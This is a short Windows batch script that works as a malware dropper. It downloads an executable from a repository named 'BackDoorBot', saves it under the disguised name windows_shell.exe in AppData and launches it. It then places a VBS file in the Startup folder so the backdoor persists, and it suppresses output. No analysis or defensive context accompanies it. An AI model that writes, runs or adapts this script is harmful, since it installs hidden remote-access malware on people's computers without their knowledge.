@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/back-d.exe -OutFile %appdata%\Microsoft\Windows\windows_shell.exe"

start %appdata%\Microsoft\Windows\windows_shell.exe

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs'"

pause > nul